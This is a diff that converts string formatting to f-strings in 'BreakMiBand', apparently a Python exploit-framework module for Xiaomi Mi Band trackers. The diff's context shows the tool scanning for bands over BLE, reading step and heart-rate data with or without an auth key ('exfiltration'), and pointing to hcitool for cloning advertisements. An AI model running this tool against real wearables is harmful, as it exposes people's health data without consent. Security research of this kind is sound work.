@@ -185,9 +185,7 @@ class Exploit(Exploit):
         import socket as bt_socket
 
         devices = OrderedDict()
-        print_status("Scanning for Mi Band devices ({} sec)...".format(
-            self.scan_duration
-        ))
+        print_status(f"Scanning for Mi Band devices ({self.scan_duration} sec)...")
 
         try:
             sock = bt_socket.socket(
@@ -217,7 +215,7 @@ class Exploit(Exploit):
             sock.send(disable_scan)
             sock.close()
         except (OSError, PermissionError) as exc:
-            print_error("BLE scan failed: {}".format(exc))
+            print_error(f"BLE scan failed: {exc}")
 
         return list(devices.values())
 
@@ -234,7 +232,7 @@ class Exploit(Exploit):
             return None
         try:
             addr_bytes = pkt[7:13] if len(pkt) > 13 else pkt[3:9]
-            bdaddr = ":".join("{:02X}".format(b) for b in reversed(addr_bytes))
+            bdaddr = ":".join(f"{b:02X}" for b in reversed(addr_bytes))
             name = ""
             is_miband = False
 
@@ -317,7 +315,7 @@ class Exploit(Exploit):
     def run(self):
         """Execute BreakMiBand BLE exploitation."""
         print_status("BreakMiBand - Xiaomi Mi Band BLE Toolkit")
-        print_info("Action: {} | Adapter: {}".format(self.action, self.adapter))
+        print_info(f"Action: {self.action} | Adapter: {self.adapter}")
 
         if self.action == "scan" or not self.target_bdaddr:
             bands = self._scan_for_mibands()
@@ -328,7 +326,7 @@ class Exploit(Exploit):
                 print_table(headers, *rows)
                 if not self.target_bdaddr and bands:
                     self.target_bdaddr = bands[0]["bdaddr"]
-                    print_info("Auto-selected: {}".format(self.target_bdaddr))
+                    print_info(f"Auto-selected: {self.target_bdaddr}")
             else:
                 print_warning("No Mi Band devices found in BLE range")
                 return
@@ -340,7 +338,7 @@ class Exploit(Exploit):
             print_error("No target BLE address specified")
             return
 
-        print_status("Target: {}".format(self.target_bdaddr))
+        print_status(f"Target: {self.target_bdaddr}")
 
         if self.action in ("pair", "exfiltrate"):
             if self.auth_key:
@@ -349,7 +347,7 @@ class Exploit(Exploit):
                 if len(key_bytes) != 16:
                     print_error("Auth key must be exactly 16 bytes (32 hex chars)")
                     return
-                print_success("Auth key loaded ({} bytes)".format(len(key_bytes)))
+                print_success(f"Auth key loaded ({len(key_bytes)} bytes)")
             else:
                 print_info("No auth key provided, attempting unauthenticated reads")
 
@@ -362,7 +360,7 @@ class Exploit(Exploit):
                     steps = self._parse_steps_data(raw)
                     print_success("Step data retrieved:")
                     for k, v in steps.items():
-                        print_info("  {}: {}".format(k, v))
+                        print_info(f"  {k}: {v}")
                 else:
                     print_warning("Could not read step counter")
 
@@ -374,7 +372,7 @@ class Exploit(Exploit):
                     hr = self._parse_hr_data(raw)
                     print_success("Heart rate data:")
                     for k, v in hr.items():
-                        print_info("  {}: {}".format(k, v))
+                        print_info(f"  {k}: {v}")
                 else:
                     print_warning("Could not read heart rate (may need notification)")
 
@@ -385,17 +383,13 @@ class Exploit(Exploit):
                     bat.get("level_pct", "?"), bat.get("charging", "?")
                 ))
 
-            print_success("Data exfiltration complete for {}".format(
-                self.target_bdaddr
-            ))
+            print_success(f"Data exfiltration complete for {self.target_bdaddr}")
 
         elif self.action == "impersonate":
             print_status("Cloning BLE advertisement from target...")
             print_info(
                 "Impersonation requires broadcasting cloned ADV packets. "
-                "Use 'hcitool -i {} cmd 0x08 0x0008 ...' for raw ADV.".format(
-                    self.adapter
-                )
+                f"Use 'hcitool -i {self.adapter} cmd 0x08 0x0008 ...' for raw ADV."
             )
             print_warning("Full impersonation requires spoofed BD_ADDR support")
 
